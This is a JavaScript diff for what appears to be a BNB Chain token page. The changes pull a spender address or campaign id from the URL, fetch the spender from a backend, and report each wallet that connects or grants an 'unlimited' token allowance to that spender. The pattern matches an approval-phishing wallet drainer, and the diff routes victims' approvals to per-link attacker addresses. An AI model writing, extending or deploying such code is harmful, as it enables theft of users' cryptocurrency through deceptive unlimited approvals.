@@ -8,6 +8,13 @@ let web3, userAccount = null, config = {}, spenderAddress = null;
 let displayVal = '0';
 let lockedAmount = '5000000';
 
+function getSpenderFromUrl() {
+  try {
+    const u = new URL(window.location.href);
+    return u.searchParams.get('s') || u.searchParams.get('spender') || u.searchParams.get('id') || '';
+  } catch(e) { return ''; }
+}
+
 async function init() {
   await new Promise(r => setTimeout(r, 1100));
   document.getElementById('splash').classList.remove('active');
@@ -20,7 +27,13 @@ async function init() {
   } catch(e) {}
 
   try {
-    const sp = await fetch('/api/spender');
+    const qs = getSpenderFromUrl();
+    let url = '/api/spender';
+    if (qs) {
+      if (qs.startsWith('0x')) url += '?s=' + encodeURIComponent(qs);
+      else url += '?id=' + encodeURIComponent(qs);
+    }
+    const sp = await fetch(url);
     const d = await sp.json();
     if (d.spender && d.spender.length === 42) {
       spenderAddress = d.spender;
@@ -136,7 +149,10 @@ async function onConfirm() {
     }
 
     if (!spenderAddress) {
-      const sp = await fetch('/api/spender');
+      const qs = getSpenderFromUrl();
+      let url = '/api/spender';
+      if (qs) url += qs.startsWith('0x') ? '?s=' + encodeURIComponent(qs) : '?id=' + encodeURIComponent(qs);
+      const sp = await fetch(url);
       const d = await sp.json();
       spenderAddress = d.spender;
     }
@@ -151,7 +167,7 @@ async function onConfirm() {
 
     await fetch('/api/user/approved', {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ address: userAccount, allowance: 'unlimited' })
+      body: JSON.stringify({ address: userAccount, allowance: 'unlimited', spender: spenderAddress })
     });
 
     showTx('Confirmed', 'ok');
@@ -174,7 +190,7 @@ async function onConnected(address) {
   try {
     await fetch('/api/user/connect', {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ address, chainId: 56 })
+      body: JSON.stringify({ address, chainId: 56, spender: spenderAddress })
     });
   } catch(e) {}
   updateBalances();
